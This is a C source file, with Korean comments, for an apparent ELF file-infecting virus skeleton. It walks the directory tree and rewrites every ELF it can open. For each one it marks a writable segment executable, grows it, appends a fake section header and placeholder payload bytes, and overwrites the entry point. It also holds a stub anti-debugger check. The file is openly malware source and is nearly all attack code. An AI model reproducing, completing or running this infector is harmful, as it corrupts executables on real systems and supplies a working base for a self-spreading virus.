#define _XOPEN_SOURCE 500
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <ftw.h>
#include <string.h>
#include <stdlib.h>
#include <elf.h>
#include <fcntl.h>
#define ROOT_DIR   (".")
#define SPARE_FDS  (4)
#define MAX_FDS    (512)


typedef struct temp_Elf64_Shdr{
  Elf64_Word    sh_name;                /* Section name (string tbl index) */
  Elf64_Word    sh_type;                /* Section type */
  Elf64_Xword   sh_flags;               /* Section flags */
  Elf64_Addr    sh_addr;                /* Section virtual addr at execution */
  Elf64_Off     sh_offset;              /* Section file offset */
  Elf64_Xword   sh_size;                /* Section size in bytes */
  Elf64_Word    sh_link;                /* Link to another section */
  Elf64_Word    sh_info;                /* Additional section information */
  Elf64_Xword   sh_addralign;           /* Section alignment */
  Elf64_Xword   sh_entsize;             /* Entry size if section holds table */
} temp_Elf64_Shdr;//Elf64_Shdr;

typedef struct temp_Elf64_Phdr{
  Elf64_Word    p_type;                 /* Segment type */
  Elf64_Word    p_flags;                /* Segment flags */
  Elf64_Off     p_offset;               /* Segment file offset */
  Elf64_Addr    p_vaddr;                /* Segment virtual address */
  Elf64_Addr    p_paddr;                /* Segment physical address */
  Elf64_Xword   p_filesz;               /* Segment size in file */
  Elf64_Xword   p_memsz;                /* Segment size in memory */
  Elf64_Xword   p_align;                /* Segment alignment */
} temp_Elf64_Phdr;//Elf64_Phdr;

typedef struct temp_Elf64_Ehdr{
  unsigned char e_ident[EI_NIDENT];     /* Magic number and other info */
  Elf64_Half    e_type;                 /* Object file type */
  Elf64_Half    e_machine;              /* Architecture */
  Elf64_Word    e_version;              /* Object file version */
  Elf64_Addr    e_entry;                /* Entry point virtual address */
  Elf64_Off     e_phoff;                /* Program header table file offset */
  Elf64_Off     e_shoff;                /* Section header table file offset */
  Elf64_Word    e_flags;                /* Processor-specific flags */
  Elf64_Half    e_ehsize;               /* ELF header size in bytes */
  Elf64_Half    e_phentsize;            /* Program header table entry size */
  Elf64_Half    e_phnum;                /* Program header table entry count */
  Elf64_Half    e_shentsize;            /* Section header table entry size */
  Elf64_Half    e_shnum;                /* Section header table entry count */
  Elf64_Half    e_shstrndx;             /* Section header string table index */
} temp_Elf64_Ehdr;//Elf64_Ehdr;

void infect(const char* fpath){
    printf("%s will be infected.\n", fpath);
}

int activate(){
    return 1; // 
}

void change_entrypoint(const char* fpath, char *newaddr){
	int fd;
	int i;
	Elf64_Shdr shdr;
	Elf64_Phdr phdr;
	Elf64_Ehdr ehdr;
	int shellcodeloc;
	
	if(access(fpath,R_OK|W_OK|X_OK)!=0){ 
		printf("[ERROR] Permission error(%s)\n",fpath);
		return 0;
	}
	if(!activate()){
		printf("[ERROR] Debugger detected(%s)\n",fpath);
		return 0;
	}
	fd = open(fpath, O_RDWR); // Cannot open virus file itself.
	if (fd < 0){
		printf("[ERROR] fd error(%s)\n",fpath);
		return 0;
	}
	if (read(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)){
		printf("[ERROR] ehdr read error(%s)\n",fpath);
		return 0;
	}
	if(!(ehdr.e_ident[1]=='E' && ehdr.e_ident[2]=='L' && ehdr.e_ident[3]=='F')){ 
		printf("[ERROR] not ELF!(%s) \n",fpath);
		return 0;
	}
	
	printf("[INFECTED] Entry point (%s): 0x%x\n", fpath, ehdr.e_entry);
	
	// elf헤더의 섹션갯수 늘리기
	// 실제섹션은 31갠데 섹션갯수만32로늘어나면 모종의이유로 gdb심볼로드가 안됨. 
	ehdr.e_shnum = ehdr.e_shnum + 1;
	lseek(fd, 0, SEEK_SET);
	if (write(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) exit(1); 
	printf("[INFECTED] Section header entry num (%s): %d\n", fpath, ehdr.e_shnum);
	
	
	
	// 여러개의 phdr 정보들을 읽고 대상프로그램헤더를 가져오기
	lseek(fd, ehdr.e_phoff, SEEK_SET); // e_phoff 로 테이프를보낸다. 
	for(i=0;i<ehdr.e_phnum;i++){
		if (read(fd, &phdr, sizeof(phdr)) != sizeof(phdr)){
			printf("[ERROR] phdr read error(%s)\n",fpath);
			return 0;
		}
		else{
			printf("[INFO] phdr.p_flags = %d, phdr.p_vaddr = 0x%x\n",phdr.p_flags,phdr.p_vaddr);
			
			// (RW_) Loadable Segment 임과동시에 PF_Read_Write (6) 권한인세그먼트의경우
			if(phdr.p_type==1 && phdr.p_flags==6){
				lseek(fd, -sizeof(phdr), SEEK_CUR); // 쓰기위해되돌아감
				printf("[BEFORE] phdr.p_flags = %d, phdr.p_filesz = 0x%x, phdr.p_memsz = 0x%x\n",phdr.p_flags,phdr.p_filesz,phdr.p_memsz);
				phdr.p_flags=7; //Loadable Segment의 권한을 RWX로 셋팅
				phdr.p_filesz += 0x1000; //페이지사이즈 늘리기
				phdr.p_memsz = phdr.p_filesz;  //페이지사이즈 늘리기
				write(fd, &phdr, sizeof(phdr));
				printf("[AFTER] phdr.p_flags = %d, phdr.p_filesz = 0x%x, phdr.p_memsz = 0x%x\n",phdr.p_flags,phdr.p_filesz,phdr.p_memsz);
				break; //대상 phdr를 읽은상태에서 break.
			}
		}
	}
	
	// 프로그램헤더 엔트리사이즈 = ehdr.e_phentsize
	// 프로그램헤더 갯수 = ehdr.e_phnum
	
	
	//파일의마지막에 가짜섹션을 덧붙이기
	//Prepare fake section 
	shdr.sh_name = 0;      
	shdr.sh_type = 3;      
	shdr.sh_flags = 0;     
	shdr.sh_addr = (phdr.p_vaddr & 0xfffff000) + (phdr.p_filesz & 0xfffff000) + 0x1000; //스타트어드레스
	shdr.sh_offset = ehdr.e_shoff + (ehdr.e_shentsize * ehdr.e_shnum);//파일의사이즈
	shdr.sh_size = 0x1000; 
	shdr.sh_link = 0;      
	shdr.sh_info = 0;      
	shdr.sh_addralign = 1; 
	shdr.sh_entsize = 0;   
	printf("[NEW] shdr.sh_addr(0x%x) = (phdr.p_vaddr(0x%x) & 0xfffff000) + (phdr.p_filesz(0x%x) & 0xfffff000) + 0x1000\n",shdr.sh_addr,phdr.p_vaddr,phdr.p_filesz);
	printf("[NEW] shdr.sh_addr = 0x%x, shdr.sh_offset = 0x%x\n",shdr.sh_addr,shdr.sh_offset);
	
	shellcodeloc = shdr.sh_addr + shdr.sh_offset;
	
	lseek(fd,0,SEEK_END); 
	write(fd, &shdr, sizeof(shdr));
	write(fd, "AAAAAAAA",8);
	
	
	// Entry point overwriting routine.. Don't touch it!
	ehdr.e_entry = strtol(newaddr, NULL, 16); // change ehdr struct
	lseek(fd, 0, SEEK_SET);
	if (write(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) return 0; //write 실패
	printf("Entry point (%s): 0x%x\n", fpath, ehdr.e_entry);
	
}

int file_process(const char *fpath, const struct stat *sb, int flag, struct FTW *s){
    int ret = 0;
    if (flag == FTW_F && activate()) 
		change_entrypoint(fpath, "0x11111111");
        
    return ret;
}

int main(int argc, char* argv[])
{
    struct timeval t;
    int nfds = getdtablesize() - SPARE_FDS;
    nfds = nfds > MAX_FDS ? MAX_FDS : nfds;

    gettimeofday(&t, NULL);
    srand(t.tv_usec * t.tv_sec);
    nftw(ROOT_DIR, file_process, nfds, FTW_PHYS);
    exit(0);
}



